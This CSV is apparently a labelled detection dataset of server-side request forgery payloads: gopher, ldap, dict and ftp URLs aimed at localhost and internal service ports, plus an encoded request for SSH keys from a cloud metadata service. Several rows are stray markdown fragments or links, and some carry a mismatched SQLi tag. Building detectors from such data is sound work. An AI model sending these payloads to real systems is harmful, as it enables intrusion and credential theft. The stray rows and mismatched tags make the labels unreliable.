Payload,Signature,AttackType,Severity,MITRE,Label,Description
gopher://127.0.0.1:25:80/config,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
gopher://127.0.0.1:25:80/health,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
gopher://127.0.0.1:25:80/status,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
gopher://127.0.0.1:25:8080,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
gopher://127.0.0.1:25:8080/,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
gopher://127.0.0.1:25:8080/admin,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
gopher://127.0.0.1:25:8080/api,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
gopher://127.0.0.1:25:8080/config,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
gopher://127.0.0.1:25:8080/health,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
gopher://127.0.0.1:25:8080/status,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
gopher://127.0.0.1:3306/_,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Advanced Server Side Request Forgery variant
gopher://localhost,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery payload
ldap://internal.server.com,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com/,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com/admin,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com/api,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com/config,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com/health,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com/status,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:22,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:22/,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:22/admin,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:22/api,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:22/config,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:22/health,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:22/status,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:27017,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:27017/,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:27017/admin,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:27017/api,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:27017/config,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:27017/health,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:27017/status,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:3306,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:3306/,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:3306/admin,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:3306/api,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:3306/config,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:3306/health,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:3306/status,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:443,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:443/,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:443/admin,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:443/api,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:443/config,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:443/health,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:443/status,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:5432,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:5432/,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:5432/admin,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:5432/api,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:5432/config,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:5432/health,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:5432/status,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:6379,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:6379/,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:6379/admin,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:6379/api,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:6379/config,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:6379/health,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:6379/status,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:80,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:80/,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:80/admin,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:80/api,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:80/config,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:80/health,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:80/status,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:8080,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:8080/,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:8080/admin,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:8080/api,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:8080/config,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:8080/health,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:8080/status,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
xGET%20/computeMetadata/v1/instance/attributes/ssh-keys%20HTTP%2f%31%2e%31%0AHost:%20metadata.google.internal%0AAccept:%20%2a%2f%2a%0aMetadata-Flavor:%20Google%0d%0a,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
| datasize  | (2 bytes) | 26 (%1A%00) |,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
| key length            | (2 bytes) | 10 | (%0A%00)       |,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
| modifier1 | (1 byte)  | 0 (%00)     |,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
| modifier2 | (1 byte)  | 0 (%00)     |,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
| value length          | (2 bytes) | 12 | (%0C%00)       |,GENERIC_INJECTION,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ftp://internal.server.com/api,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
* [Jira](https://github.com/assetnote/blind-ssrf-chains#jira),SQLi,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
* [JBoss](https://github.com/assetnote/blind-ssrf-chains#jboss),SQLi,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:27017/health,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
dict://127.0.0.1:11211:80,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ftp://internal.server.com:6379/config,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com/api,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ftp://internal.server.com/health,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
* Daemon socket option: <https://docs.docker.com/engine/reference/commandline/dockerd/#daemon-socket-option>,SQLi,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
dict://127.0.0.1:11211:6379/status,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
dict://127.0.0.1:11211:80/,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ftp://internal.server.com/config,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
dict://127.0.0.1:11211/stats,SSRF,Server Side Request Forgery,High,T1190,Malicious,Advanced Server Side Request Forgery variant
dict://127.0.0.1:11211:6379/health,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
gopher://127.0.0.1:25:80,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
dict://127.0.0.1:11211:80/health,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
%0astats%0aquit,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:22/status,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
| value length          | (2 bytes) | 12 | (%0C%00)       |,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ftp://internal.server.com:22/status,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
dict://127.0.0.1:11211:443,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
dict://127.0.0.1:11211:8080/,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
dict://127.0.0.1:11211/admin,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
SET%20mykey%20,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:3306/,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ldap://internal.server.com:80/admin,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
ftp://internal.server.com:27017/status,SSRF,Server Side Request Forgery,High,T1190,Malicious,Server Side Request Forgery attack attempt
